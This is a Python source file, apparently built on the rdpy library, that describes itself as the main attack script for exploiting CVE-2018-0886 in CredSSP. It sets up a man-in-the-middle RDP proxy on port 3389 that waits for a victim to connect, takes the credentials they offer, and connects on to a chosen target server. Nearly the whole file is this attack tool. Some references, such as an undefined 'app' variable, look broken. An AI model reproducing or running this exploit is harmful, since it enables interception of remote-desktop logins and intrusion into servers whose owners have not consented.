#!/usr/bin/python
#
# Copyright (c) 2014-2015 Sylvain Peyrefitte
#
# This file is part of rdpy.
#
# rdpy is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.
#
"""
This is the main attack script for exploiting the CVE-2018-0886 vulnerability
See usage.
"""

import sys, os, getopt, time

from rdpy.core import log, error, rss
from rdpy.protocol.rdp import rdp
from twisted.internet import  defer

from rdpy.protocol.rdp import rdp
import rdpy.core.log as log
from rdpy.core.error import RDPSecurityNegoFail
from twisted.internet import task

log._LOG_LEVEL = log.Level.DEBUG

class ProxyServer(rdp.RDPServerObserver):
    """
    @summary: Server side of proxy
    """
    def __init__(self, app,controller, target, clientSecurityLevel, rssRecorder):
        """
        @param controller: {RDPServerController}
        @param target: {tuple(ip, port)}
        @param rssRecorder: {rss.FileRecorder} use to record session
        """
        rdp.RDPServerObserver.__init__(self, controller)
        self._controller=controller
        self._target = target
        self._client = None
        self._app=app
        self._clientSecurityLevel = clientSecurityLevel
        self._reallyReady=False #the connection was set successfully

    def setClient(self, client):
        """
        @summary: Event throw by client when it's ready
        @param client: {ProxyClient}
        """
        self._client = client

    def onReady(self,reallyReady=True):
        """
        @summary:  Event use to inform state of server stack
                    First time this event is called is when human client is connected
                    Second time is after color depth nego, because color depth nego
                    restart a connection sequence
        @see: rdp.RDPServerObserver.onReady
        """
        if reallyReady: #that is in case of the original call to onReady . now we call it prematurely .
            self._reallyReady=True
        if self._client is None:
            #try a connection
            domain, username, password = self._controller.getCredentials()
            reactor.connectTCP(self._target[0], int(self._target[1]), ObserverMock())

    def onClose(self):
        """
        @summary: Call when human client close connection
        @see: rdp.RDPServerObserver.onClose
        """
        if self._client is None:
            return
        self._client.close()


class ProxyServerFactory(rdp.ServerFactory):
    """
    @summary: Factory on listening events
    """
    def __init__(self, app,target,privateKeyFilePath, certificateFilePath, clientSecurity):
        """
        @param target: {tuple(ip, prt)}
        @param privateKeyFilePath: {str} file contain server private key (if none -> back to standard RDP security)
        @param certificateFilePath: {str} file contain server certificate (if none -> back to standard RDP security)
        @param clientSecurity: {str(ssl|rdp)} security layer use in client connection side
        """
        self._target = target
        self._clientSecurity = clientSecurity
        self._app=app
        #use produce unique file by connection
        self._uniqueId = 0
        rdp.ServerFactory.__init__(self, 16, privateKeyFilePath, certificateFilePath)

    def buildObserver(self, controller, addr):
        """
        @param controller: {rdp.RDPServerController}
        @param addr: destination address
        @see: rdp.ServerFactory.buildObserver
        """
        self._uniqueId += 1
        return ProxyServer(self._app,controller, self._target, self._clientSecurity,None)

class ObserverMock(rdp.ClientFactory):
    def __init__(self):
        pass
    def onReady(self):
        pass
    def clientConnectionLost(self, connector, reason):
        pass
    def clientConnectionFailed(self, connector, reason):
        pass
    def buildObserver(self, controller, addr):
        pass

def help():
    """
    @summary: Print help in console
    """
    print """
    Usage:  credsspattack.py -k private_key -c cert_file [-l port]  target
            -l listen_port default 3389
            -k private_key_file_path (generated by gen_cmd.py)
            -c certificate_file_path (generated by gen_cmd.py)
            target should be DNS so that kerberos will happen

    This is the main attack script for exploiting the CVE-2018-0886 vulnerability.
    It should be executed after running the gen_cmd.py script to generate a suitable private and public key.
    It waits for the user to connect (to listen port) and executes the attack on the target server chosen.

    It mainly composed of RDP proxy based upon rdpy implementation.
    """

def errE(x):
    raise Exception(x)
if __name__ == '__main__':
    import qt4reactor
    qt4reactor.install()
    from twisted.internet import reactor

    listen = "3389"

    d=defer.Deferred()
    d.addErrback(errE )
    privateKeyFilePath = None
    certificateFilePath = None

    target=None

    #for anonymous authentication
    clientSecurity = rdp.SecurityLevel.RDP_LEVEL_SSL

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hl:k:c:o:n")
    except getopt.GetoptError:
        help()
    ok=0
    for opt, arg in opts:
        if opt == "-h":
            help()
            sys.exit()
        elif opt == "-k":
            privateKeyFilePath = arg
            ok+=1
        elif opt == "-c":
            certificateFilePath = arg
            ok+=1
        elif opt == "-l":
            listen=arg
    if ok<2 or len(args)<1:
        help()
        sys.exit(-1)

    clientSecurity = rdp.SecurityLevel.RDP_LEVEL_NLA

    if not os.path.exists(privateKeyFilePath) or not os.path.exists(certificateFilePath):
        log.error('Must specify correct cert and private key files')
        help()
        sys.exit()

    prot=ProxyServerFactory(app,(args[0]), privateKeyFilePath, certificateFilePath, clientSecurity)
    reactor.listenTCP(int(listen),prot)
    reactor.run()